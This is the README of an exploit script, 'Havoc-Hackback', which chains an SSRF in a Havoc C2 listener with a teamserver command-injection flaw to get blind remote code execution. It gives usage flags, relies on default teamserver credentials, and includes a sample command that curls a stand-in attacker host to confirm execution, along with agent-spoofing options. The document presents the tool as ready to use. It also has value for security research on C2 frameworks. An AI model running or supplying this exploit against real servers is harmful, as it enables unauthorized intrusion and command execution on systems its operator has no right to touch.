# Havoc-Hackback

# Summary

This script provides RCE through an SSRF against a havoc teamserver. 

Credit to chebuya and hyperreality for finding and writing up the PoCs. This Script just combines them.
https://github.com/chebuya/Havoc-C2-SSRF-poc/
https://github.com/IncludeSecurity/c2-vulnerabilities/

Hyperreality's exploit attacks the Havoc teamserver port and can be used to execute arbitrary commands. This is normally difficult to pull off, however, since the teamserver port is not normally reachable by victims. 

Chebuya's script attacks a havoc listening port, forcing the teamserver to open a remote socket that we can then write bytes to. Since this request comes from the teamserver itself, it can be used to attack the teamserver port.

This script combines both exploits, enabling RCE against a havoc teamserver that is beyond our reach.


# Usage

```
usage: exploit.py [-h] -t TARGET -c CMD [-u USER] [-p PASSWORD] [-i IP] [-P PORT][-q QUIET] [spoofing options]

options:
  -t, --target TARGET   The listener target in URL format
  -c, --cmd CMD         Blind command to perform. No output will be given.
  -u, --user USER       The username to authenticate to teamserver with
  -p, --password PASSWORD
                        Password for joining teamserver
  -i, --ip IP           The IP of the Havoc Teamserver. Use 127.0.0.1 in most instances.
  -P, --port PORT       The teamserver port
```

In most cases the usage is:

```
python exploit.py -t https://IP -c <cmd>
```

This will use default credentials in order to attack the teamserver behind the listener. The command will be executed blindly. A good test would be to open a python webserver and attempt a curl request.

```
sudo python -m http.server 80

python exploit.py -t https://havoclistener.com -c curl http://attackerip.com/test
```

If credentials are found, they can be used with the -u and -p commands.


The following options are carried over from chebuya's script in order to preserve the capability make custom fields in the spoofed agent.

```
# Agent spoofing options
  -A, --user-agent USER_AGENT
                        The User-Agent for the spoofed agent
  -H, --hostname HOSTNAME
                        The hostname for the spoofed agent
  -U, --spoofed-username SPOOFED_USERNAME
                        The username for the spoofed agent
  -d, --domain-name DOMAIN_NAME
                        The domain name for the spoofed agent
  -n, --process-name PROCESS_NAME
                        The process name for the spoofed agent
  -ip, ---internal-ip INTERNAL_IP
                        The internal ip for the spoofed agent
  -q, --quiet QUIET     Don't show banner
```

